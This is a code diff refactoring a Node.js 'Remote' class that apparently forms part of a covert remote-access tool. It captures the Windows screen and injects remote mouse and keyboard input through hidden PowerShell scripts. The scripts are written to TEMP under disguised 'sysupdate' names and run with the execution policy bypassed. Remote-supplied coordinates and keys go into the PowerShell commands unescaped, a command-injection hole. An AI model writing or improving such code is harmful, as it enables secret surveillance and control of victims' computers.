@@ -7,9 +7,10 @@ class Remote {
   constructor(agent) {
     this.agent = agent;
     this.streaming = false;
-    this.captureProcess = null;
+    this.captureTimer = null;
     this.fps = 5;
     this.quality = 50;
+    this.capturing = false;
 
     agent.on('shell-input', (data) => {
       const msg = data.toString();
@@ -25,23 +26,26 @@ class Remote {
     if (this.streaming) return;
     this.streaming = true;
     log.info('Remote desktop started');
-    this._captureLoop();
+    this._scheduleCapture();
   }
 
   stop() {
     this.streaming = false;
-    if (this.captureProcess) {
-      this.captureProcess.kill();
-      this.captureProcess = null;
-    }
+    if (this.captureTimer) { clearTimeout(this.captureTimer); this.captureTimer = null; }
     log.info('Remote desktop stopped');
   }
 
-  _captureLoop() {
-    if (!this.streaming) return;
+  _scheduleCapture() {
+    if (!this.streaming || this.capturing) return;
+    this.captureTimer = setTimeout(() => this._capture(), 1000 / this.fps);
+  }
 
-    const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-capture.ps1');
+  _capture() {
+    if (!this.streaming) return;
+    this.capturing = true;
+
     const outPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-frame.jpg');
+    const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-capture.ps1');
 
     const ps = `
 Add-Type -AssemblyName System.Windows.Forms
@@ -59,25 +63,25 @@ $bmp.Dispose()
 `;
     fs.writeFileSync(scriptPath, ps);
 
-    this.captureProcess = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], {
+    const proc = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], {
       windowsHide: true
     });
 
-    this.captureProcess.on('exit', () => {
+    proc.on('exit', () => {
+      this.capturing = false;
       if (!this.streaming) return;
       try {
         const frame = fs.readFileSync(outPath);
-        this.agent.send(frame);
+        if (frame.length > 0) this.agent.send(frame);
       } catch {}
-      // Schedule next frame
-      setTimeout(() => this._captureLoop(), 1000 / this.fps);
+      this._scheduleCapture();
     });
   }
 
   handleInput(json) {
     try {
       const event = JSON.parse(json);
-      
+
       if (event.type === 'settings') {
         if (event.quality) this.quality = event.quality;
         if (event.fps) this.fps = event.fps;
@@ -89,42 +93,31 @@ $bmp.Dispose()
         return;
       }
 
-      const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-input.ps1');
-      let ps = '';
-
       if (event.type === 'mousemove') {
-        ps = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${event.x}, ${event.y})`;
+        this._runInput(`[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${event.x}, ${event.y})`);
       } else if (event.type === 'mousedown') {
-        ps = `
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class Mouse {
-    [DllImport("user32.dll")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
-    public static void Click(int x, int y) {
-        System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
-        mouse_event(${event.button === 2 ? '0x0008' : '0x0002'}, 0, 0, 0, 0);
-        mouse_event(${event.button === 2 ? '0x0010' : '0x0004'}, 0, 0, 0, 0);
-    }
-}
-"@ -ReferencedAssemblies System.Windows.Forms
-[Mouse]::Click(${event.x}, ${event.y})`;
+        const flags = event.button === 2 ? '0x0008, 0x0010' : '0x0002, 0x0004';
+        this._runInput(`
+[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(${event.x}, ${event.y})
+$sig = '[DllImport("user32.dll")] public static extern void mouse_event(int f, int x, int y, int d, int e);'
+$m = Add-Type -MemberDefinition $sig -Name WinMouse -Namespace Win -PassThru
+$m::mouse_event(${flags.split(',')[0].trim()}, 0, 0, 0, 0)
+$m::mouse_event(${flags.split(',')[1].trim()}, 0, 0, 0, 0)
+`);
       } else if (event.type === 'keydown') {
         const key = this._mapKey(event.key);
-        if (key) {
-          ps = `Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${key}')`;
-        }
-      }
-
-      if (ps) {
-        fs.writeFileSync(scriptPath, ps);
-        spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], {
-          windowsHide: true
-        });
+        if (key) this._runInput(`[System.Windows.Forms.SendKeys]::SendWait('${key}')`);
       }
     } catch (e) {
       log.error(`Remote input error: ${e.message}`);
     }
+  }
+
+  _runInput(cmd) {
+    const script = `Add-Type -AssemblyName System.Windows.Forms\nAdd-Type -AssemblyName System.Drawing\n${cmd}`;
+    const scriptPath = path.join(process.env.TEMP || 'C:\\Temp', 'sysupdate-input.ps1');
+    fs.writeFileSync(scriptPath, script);
+    spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath], { windowsHide: true });
   }
 
   _mapKey(key) {
@@ -139,7 +132,6 @@ public class Mouse {
     };
     if (map[key]) return map[key];
     if (key.length === 1) {
-      // Escape special SendKeys chars
       if ('+^%~(){}[]'.includes(key)) return `{${key}}`;
       return key;
     }
